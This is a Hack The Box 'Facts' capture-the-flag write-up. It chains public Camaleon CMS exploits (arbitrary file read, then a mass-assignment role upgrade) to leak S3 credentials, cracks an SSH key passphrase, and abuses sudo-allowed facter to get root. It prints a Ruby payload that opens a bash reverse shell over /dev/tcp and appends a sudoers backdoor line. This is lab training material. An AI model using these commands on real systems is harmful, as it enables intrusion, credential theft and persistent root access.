# Facts (HTB)

**Platform:** Hack The Box
 **Difficulty:** Easy
 **Goal:** Capture the user and root flags

------

# Reconnaissance

I started with an initial scan using Nmap to identify open ports and running services.

```
nmap -T4 -A -v 10.129.X.X
```

### Scan Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp open  http    nginx 1.26.3 (Ubuntu)
```

Additional information from the scan:

- The SSH service is running **OpenSSH 9.9p1**.
- The web server is **nginx 1.26.3**.
- The HTTP service redirects to the domain:

```
http://facts.htb/
```

This indicates the use of a **virtual host**, so the domain must be added to `/etc/hosts` to access the website properly.

------

# Enumeration

Next, I performed directory enumeration using ffuf.

```
ffuf -u http://facts.htb/FUZZ -w raft-large-directories-lowercase.txt -mc 200,301,302,403 -c
```

### Discovered Endpoints

Important directories discovered:

- `/admin`
- `/search`
- `/ajax`
- `/sitemap`
- `/robots`
- `/captcha`

The `/search` endpoint revealed that search requests are processed using the following URL format:

```
/search?q=<query>
```

------

### Admin Panel

The `/admin` directory revealed several endpoints:

```
/admin/login
/admin/register
/admin/forgot
```

I registered a new account and logged into the application.

While reviewing the profile section:

```
/admin/profile/edit
```

I noticed the application was running:

**Camaleon CMS version 2.9.0**

------

# Exploitation

Searching for vulnerabilities affecting this version of Camaleon CMS revealed a public exploit:

**CVE‑2024‑46987**

Exploit source:

```
https://github.com/Goultarde/CVE-2024-46987
```

The exploit allows arbitrary file reads from the server.

### Exploit Command

```
python3 CVE-2024-46987.py -u http://facts.htb -l USERNAME -p PASSWORD /etc/passwd
```

Reading `/etc/passwd` revealed several system users:

```
root
william
trivia
```

Using the same exploit, I retrieved the user flag from:

```
/home/trivia/user.txt
```

------

# Privilege Escalation

Further research revealed another vulnerability affecting the CMS:

**CVE‑2025‑2304**

Exploit repository:

```
https://github.com/Alien0ne/CVE-2025-2304
```

The vulnerability occurs because the application uses `permit!` in a controller, allowing modification of restricted parameters.

controller action below updates a user with `permit!`:

```
def updated_ajax
  @user = current_site.users.find(params[:user_id])
  update_session = current_user_is?(@user)

  @user.update(params.require(:password).permit!)
  render inline: @user.errors.full_messages.join(', ')

  # keep user logged in when changing their own password
  update_auth_token_in_cookie @user.auth_token if update_session && @user.saved_change_to_password_digest?
end
```



Because `permit!` allows **all** keys under `password`, an attacker can send:

- `password[password]`
- `password[password_confirmation]`
- **`password[role]=admin`**

and the application will accept it, upgrading the user’s role.

Example vulnerable code:

```
@user.update(params.require(:password).permit!)
```

This allows an attacker to submit:

```
password[role]=admin
```

and escalate their privileges.

------

### Running the Exploit

```
python3 exploit.py -u http://facts.htb -U USER -P PASSWORD --newpass aass11223 -e -r
```

After exploitation, the script extracted **S3 credentials**.

```
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 5
   Current User Role: client
[+]Loading **PPRIVILEGE ESCALATION**
   User ID: 5
   Updated User Role: admin
[+]Extracting **S3 Credentials**
   **s3 access key: AKIA8E0340064****
   **s3 secret key: 08lQrT05W/0XmTkJrkbK02WXMgz5lldXt****
   s3 endpoint: http://localhost:54321
[+]Reverting User Role
   User ID: 5
   User Role: client
```



------

# S3 Enumeration

The credentials were used with the AWS  tool.

```
aws --endpoint-url http://facts.htb:54321 s3 ls
```

Buckets discovered:

```
internal
randomfacts
```

Listing the internal bucket:

```
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal
```

Revealed:

```
.ssh/
.cache/
.bundle/
```

Inside `.ssh` I found:

```
id_ed#####
```

------

# SSH Access

The private key was downloaded:

```
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
```

After setting proper permissions:

```
chmod 600 id_ed25519
```

The key required a passphrase. I extracted the hash using `ssh2john` and cracked it with John the Ripper using the rockyou wordlist.

That File(id_ed####) A Brivate key for ssh connection

**After Download the private key, I converted it into a format compatible with John the Ripper using `ssh2john.py`. Then, I launched a dictionary attack with the rockyou wordlist. Within a few minutes, John successfully recovered the passphrase: `dragonballz`**

SSH access was obtained with the user **trivia**.

------

# Root Privilege Escalation

Checking sudo permissions:

```
sudo -l
```

Output:

```
(ALL) NOPASSWD: /usr/bin/facter
```

The binary `/usr/bin/facter` is part of Facter and loads Ruby scripts from custom directories.

By creating a malicious Ruby fact file, I was able to execute commands as root.

Example malicious fact:

```
cat > /tmp/facter_facts/root.rb << 'EOF'
Facter.add('exploit') do
  setcode do
    system("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/<Target_Port> 0>&1'")
    system("echo 'yourusername ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
  end
end
```

Start a listener:

```
nc -lvnp 4444
```

Run:

```
sudo facter --custom-dir /tmp/facter_facts
```

This resulted in a **root reverse shell**.

------

# Flags

User flag:

```
/home/william/user.txt
```

Root flag:

```
/root/root.txt
```
